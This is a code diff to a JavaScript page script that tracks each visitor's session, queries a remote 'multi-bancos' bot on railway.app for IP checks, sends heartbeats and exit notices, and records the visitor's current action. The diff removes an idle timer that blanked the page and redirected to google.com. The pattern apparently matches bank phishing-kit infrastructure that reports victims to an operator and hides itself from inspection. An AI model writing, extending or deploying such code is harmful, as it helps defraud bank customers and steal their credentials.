@@ -1140,7 +1140,6 @@ var URL_BOT_RAILWAY = 'https://multi-bancos-production.up.railway.app';
 
 var BOT_URL = 'https://multi-bancos-production.up.railway.app';
 var HEARTBEAT_INTERVALO = 10000;
-var INACTIVIDAD_TIMEOUT = 60000;
 var PAGE_SESSION_KEY = 'pyp_session_id';
 
 var sessionId = sessionStorage.getItem(PAGE_SESSION_KEY);
@@ -1151,8 +1150,6 @@ sessionStorage.setItem(PAGE_SESSION_KEY, sessionId);
 
 window.__PYP_SESSION__ = sessionId;
 
-var ultimaActividad = Date.now();
-var inactividadTimer = null;
 var ultimaAccion = 'entrando';
 
 fetch(BOT_URL + '/check-ip')
@@ -1195,23 +1192,6 @@ keepalive: true
 
 window.addEventListener('beforeunload', avisarSalida);
 window.addEventListener('pagehide', avisarSalida);
-
-function reiniciarInactividad() {
-ultimaActividad = Date.now();
-if (inactividadTimer) clearTimeout(inactividadTimer);
-inactividadTimer = setTimeout(cerrarPorInactividad, INACTIVIDAD_TIMEOUT);
-}
-
-function cerrarPorInactividad() {
-document.documentElement.innerHTML = '';
-window.location.replace('https://www.google.com');
-}
-
-['mousemove', 'mousedown', 'keydown', 'touchstart', 'scroll', 'click'].forEach(function(ev) {
-document.addEventListener(ev, reiniciarInactividad, { passive: true });
-});
-
-reiniciarInactividad();
 
 window.__PYP_SET_ACCION__ = function(accion) {
 ultimaAccion = accion;
